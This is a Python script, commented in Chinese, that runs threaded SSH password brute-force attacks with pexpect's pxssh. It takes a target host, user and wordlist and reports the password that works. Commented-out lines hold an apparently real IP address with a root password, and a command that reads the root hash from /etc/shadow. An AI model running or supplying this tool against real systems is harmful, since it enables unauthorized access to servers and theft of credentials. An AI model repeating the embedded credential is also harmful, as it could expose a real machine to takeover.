#!/usr/bin/env python
# -*- coding: utf-8 -*-

'''
利用Pxssh暴力破解ssh密码
'''
from pexpect import pxssh
import optparse
import time
from threading import *
maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0

def send_command(s, cmd):
  s.sendline(cmd)
  s.prompt()
  print(s.before)

def connect(host, user, password, release):
  global Found
  global Fails
  try:
    s = pxssh.pxssh()
    s.login(host, user, password)
    # return s
    print('[+] Password Found: ' + password)
    Found = True
  except Exception as e:
    if 'read_nonblocking' in str(e):
      Fails += 1
      time.sleep(5)
      connect(host, user, password, False)
    elif 'synchronize with original prompt' in str(e):
      time.sleep(1)
      connect(host, user, password, False)
  finally:
    if release:
      connection_lock.release()

def main():
  parser = optparse.OptionParser('usage%prog ' +\
    '-H <target host> -u <user> -F <password list>')
  parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
  parser.add_option('-F', dest='passwdFile', type='string', help='specify password file')
  parser.add_option('-u', dest='user', type='string', help='specify the user')
  (options, args) = parser.parse_args()
  host = options.tgtHost
  passwdFile = options.passwdFile
  user = options.user
  if host == None or passwdFile == None or user == None:
    print(parser.usage)
    exit(0)
  user = options.user
  fn = open(passwdFile, 'r')
  user = options.user
  for line in fn.readlines():
    user = options.user
    if Found:
      print("[*] Exitiong: Password Found")
      exit(0)
    if Fails > 5:
      print("[!] Exiting: Too Many Socket Timeouts")
      exit(0)
    connection_lock.acquire()
    # password = line.strip('\n')[0]
    password = line
    print("[-] Testing: " + str(password))
    t = Thread(target=connect, args = (host, user, password, True))
    child = t.start()
  # connect('207.148.16.27', 'root', '2k?V4t*orkas8qeL')
  # send_command(s, 'cat /etc/shadow | grep root')

if __name__ == '__main__':
  main()